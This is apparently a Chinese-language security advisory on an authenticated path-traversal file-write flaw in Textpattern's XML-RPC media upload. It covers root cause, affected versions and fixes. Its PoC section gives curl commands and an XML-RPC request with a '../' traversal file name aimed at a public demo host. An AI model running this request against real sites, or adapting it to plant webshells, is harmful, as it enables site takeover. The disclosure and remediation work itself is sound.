# 漏洞报告：Textpattern XML-RPC 任意路径文件写入

## 1. 基本信息

1. 漏洞名称：metaWeblog.newMediaObject 任意路径文件写入（可导致 RCE/文件覆盖）。
2. 风险等级：高危，建议 CVSS v3.1 8.8（AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H）。
3. 漏洞类型：CWE-22（路径穿越）、CWE-73（外部可控文件名）、CWE-434（危险文件写入）。
4. 发现时间：2026-02-27。
5. 验证目标：https://dev-demo.textpattern.co/dev/rpc/

## 2. 受影响范围

1. 代码确认受影响：rpc/TXP_RPCServer.php:914 (/textpattern/rpc/TXP_RPCServer.php:914) 附近 mt_uploadImage()。
2. 当前仓库版本：textpattern/lib/constants.php:32 (/textpattern/textpattern/lib/constants.php:32) 为 5.0.0-dev，受影响。
3. 4.9.1 标签代码中同样存在该实现（本地 git show 4.9.1:rpc/TXP_RPCServer.php 已核对）。
4. 历史上 metaWeblog.newMediaObject 在 4.9.0 引入（HISTORY.txt:108 (/textpattern/HISTORY.txt:108)），因此 4.9.0+ 应视为受影响区间。
5. XML-RPC 默认配置是关闭（core.prefs:113 (/textpattern/textpattern/vendors/Textpattern/DB/Data/core.prefs:113)），但一旦启用即暴露风险。

## 3. 漏洞成因

1. 入口方法 mt_uploadImage() 直接使用用户可控 file.name 拼接路径写文件：rpc/TXP_RPCServer.php:924-925 (/textpattern/rpc/TXP_RPCServer.php:924)。
2. 未对 file.name 做 basename/sanitizeForFile，允许 ../ 等路径穿越。
3. XML-RPC 底层会把 <base64> 自动解码为原始字节（IXRClass.php:329-330 (/textpattern/textpattern/lib/IXRClass.php:329)），攻击者可写任意内容。
4. 后续 image_data() 仅用于图片处理；如果不是图片会报错返回字符串（txplib_admin.php:390-392 (/textpattern/textpattern/lib/txplib_admin.php:390)），但前面写入的文件不会清理。
5. 调用方未校验 image_data() 返回类型，直接取 [1]（rpc/TXP_RPCServer.php:933 (/textpattern/rpc/TXP_RPCServer.php:933)），导致异常响应但不影响前置写文件动作。
6. 该方法仅校验“是否登录”（rpc/TXP_RPCServer.php:918-921 (/textpattern/rpc/TXP_RPCServer.php:918)），未额外校验 image.\* 权限。

## 4. 影响与利用条件

1. 利用条件：XML-RPC 已启用 + 任意有效后台账号（privs>0）。
2. 影响结果：任意路径写文件、覆盖文件、潜在 WebShell 落地（取决于目标路径可执行性）。
3. 业务影响：机密泄露、站点接管、服务不可用（覆盖关键文件）。

## 5. PoC 复现过程（授权环境）

1. 确认 XML-RPC 入口可达：

curl -ksS -i 'https://dev-demo.textpattern.co/dev/rpc/' | head -n 20

2. 使用账号发送 metaWeblog.newMediaObject 请求：

cat > /tmp/txp_poc.xml <<'EOF'

  <?xml version="1.0"?>
  <methodCall>
    <methodName>metaWeblog.newMediaObject</methodName>
    <params>
      <param><value><string>default</string></value></param>
      <param><value><string>managing-editor622</string></value></param>
      <param><value><string>managing-editor622</string></value></param>
      <param><value><struct>
        <member><name>name</name><value><string>/../../../../proc/self/cwd/../images/poc_test.txt</string></
  value></member>
        <member><name>type</name><value><string>text/plain</string></value></member>
        <member><name>bits</name><value><base64>UE9DX1RYUF9BUkJJVFJBUllfV1JJVEVfMjAyNjAyMjc=</base64></
  value></member>
      </struct></value></param>
    </params>
  </methodCall>
  EOF

curl -ksS 'https://dev-demo.textpattern.co/dev/rpc/' \
 -H 'Content-Type: text/xml' \
 --data-binary @/tmp/txp_poc.xml

1. 命中判据：返回 methodResponse，其中出现 url 字段（实测该环境返回过 /images/n.txt）。
2. 说明：该 demo 当前存在维护/重建波动，公网静态路径不总是稳定可读；但请求已进入漏洞函数并触发异常分支，满足漏洞触发证据。

## 6. 修复方法

1. 文件名强制安全化：
   $safeName = sanitizeForFile(basename($file['name']));
2. 禁止路径拼接写入，使用安全临时文件：
   $tmp = tempnam(rtrim(get*pref('tempdir', sys_get_temp_dir()), DS), 'rpc*');
3. 严格 base64 校验：
   $raw = base64_decode($file['bits'], true); if ($raw === false) return IXR_Error(...);
4. 写入后严格校验 image_data() 返回值，失败立即删除临时文件并返回错误。
5. 增加权限校验：除登录外，检查 has_privs('image.edit.own', $txp->txp_user) 或更高权限。
6. 限制大小与类型：上传前后都做大小阈值和 MIME/格式白名单校验。
7. 临时缓解：未修复前关闭 XML-RPC（enable_xmlrpc_server=0）。
